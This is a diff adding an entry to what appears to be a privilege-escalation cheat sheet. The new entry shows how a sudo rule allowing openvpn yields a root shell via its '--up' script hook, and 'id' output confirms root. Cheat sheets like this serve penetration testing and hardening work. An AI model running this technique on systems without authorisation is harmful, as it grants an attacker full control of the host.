@@ -1346,6 +1346,12 @@ sh-3.2# id
 uid=0(root) gid=0(root)
 ````
 ### sudo -l / SUID Binaries
+#### (ALL : ALL) /usr/sbin/openvpn
+````
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+````
 #### (root) NOPASSWD: /usr/bin/nmap
 ````
 bash-3.2$ id     
